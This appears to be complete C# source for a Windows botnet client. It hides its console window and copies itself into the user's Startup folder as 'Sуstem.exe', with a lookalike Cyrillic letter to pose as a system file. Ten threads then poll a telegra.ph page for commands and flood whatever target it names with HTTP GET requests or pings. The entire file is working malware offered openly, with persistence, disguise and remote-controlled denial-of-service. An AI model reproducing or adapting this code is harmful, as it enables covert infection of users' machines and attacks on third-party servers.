//==============================================================
//|| Author: samuraisudo                                      ||
//|| Gmail: devsamuraisudo@gmail.com                          ||
//|| Git: https://github.com/samuraisudo                      ||
//|| Git rep: https://github.com/samuraisudo/telegraph_botnet ||
//==============================================================

using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;
namespace bnetssss
{
    class Program
    {
        static void Send_get()
        {
            //                         telegraph url
            string url_target = "https://telegra.ph/0-0-0-0";
            while (true)
            {
                using (WebClient client = new WebClient())
                {
                    string htmlCode = client.DownloadString(url_target);
                    Match regs = Regex.Match(htmlCode, "</address><p>(.*)</p></article>");
                    Match head_text = Regex.Match(htmlCode, "<h1>(.*)<br></h1><address>");
                    string target_attack = regs.Groups[1].Value;
                    string head_text_str = head_text.Groups[1].Value;

                    if (head_text_str == "STOP")
                    {
                        Thread.Sleep(10000);
                    }
                    else if (head_text_str == "GET")
                    {

                        try { client.DownloadString(target_attack); } catch { }
                    }
                    else if (head_text_str == "DPING")
                    {
                        try
                        {
                            System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
                            System.Net.NetworkInformation.PingReply pingReply = ping.Send(target_attack);
                        }
                        catch { }
                    }
                    else
                    {
                        Thread.Sleep(10000);
                    }
                    string html_code = htmlCode;
                }
            }
        }
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string exe_name = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                string sourceFile = @"" + exe_name;
                string user_name = System.Environment.UserName;
                string destinationFile = @"C:\Users\" + user_name + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sуstem.exe";
                System.IO.File.Move(sourceFile, destinationFile);
            }
            catch { }
            Thread t0 = new Thread(Send_get);
            Thread t1 = new Thread(Send_get);
            Thread t2 = new Thread(Send_get);
            Thread t3 = new Thread(Send_get);
            Thread t4 = new Thread(Send_get);
            Thread t5 = new Thread(Send_get);
            Thread t6 = new Thread(Send_get);
            Thread t7 = new Thread(Send_get);
            Thread t8 = new Thread(Send_get);
            Thread t9 = new Thread(Send_get);
            t0.Start();
            t1.Start();
            t2.Start();
            t3.Start();
            t4.Start();
            t5.Start();
            t6.Start();
            t7.Start();
            t8.Start();
            t9.Start();
        }
    }
}
